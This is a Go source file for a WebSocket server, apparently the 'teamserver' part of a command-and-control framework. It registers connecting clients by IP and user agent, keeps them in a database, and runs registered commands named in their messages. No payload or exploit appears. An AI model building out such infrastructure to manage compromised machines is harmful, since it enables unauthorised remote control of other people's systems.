package server

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"time"
	"teamserver/utils"

	"github.com/gorilla/websocket"
	"github.com/google/uuid"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func handleClient(conn *websocket.Conn, r *http.Request) {
	defer conn.Close()

	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	id := uuid.New().String()
	client := &Client{
		ID:        id,
		Conn:      conn,
		IP:        ip,
		LastSeen:  time.Now(),
		UserAgent: r.UserAgent(),
	}

	ClManager.Register(client)
	fmt.Printf("[+] Client connected: %s (%s)\n", id, ip)

	defer func() {
		ClManager.Unregister(id)
		fmt.Printf("[-] Lost connection to client: %s\n", id)
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		client.LastSeen = time.Now()
		fmt.Printf("[>] %s: %s\n", id, string(msg))

        var command = utils.CommandFactory("help", utils.Commands["help"])
        if utils.IsValidCommand(string(msg)) {
            command = utils.CommandFactory(string(msg), utils.Commands[string(msg)])
        }
        command.SetArgs([]string{})
        command.Execute()

		err = conn.WriteMessage(websocket.TextMessage, []byte("Command '"+command.Name()+"' startet"))
		if err != nil {
			break
		}
	}
}

func StartWebSocketServer(port int) {
	InitDB()

	clients := LoadClientsFromDB()
	fmt.Printf("[*] %d saved clients loaded:\n", len(clients))
	for _, a := range clients {
		fmt.Printf("    ID: %s | IP: %s | LastSeen: %s\n", a.ID, a.IP, a.LastSeen.Format(time.RFC3339))
	}

	http.HandleFunc("/client", func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			log.Println("[-] Upgrade failed:", err)
			return
		}
		go handleClient(conn, r)
	})

	addr := fmt.Sprintf("0.0.0.0:%d", port)
	fmt.Printf("[*] WebSocket-Server running on %s/client\n", addr)
	err := http.ListenAndServe(addr, nil)
	if err != nil {
		log.Fatal("[-] Error on starting:", err)
	}
}
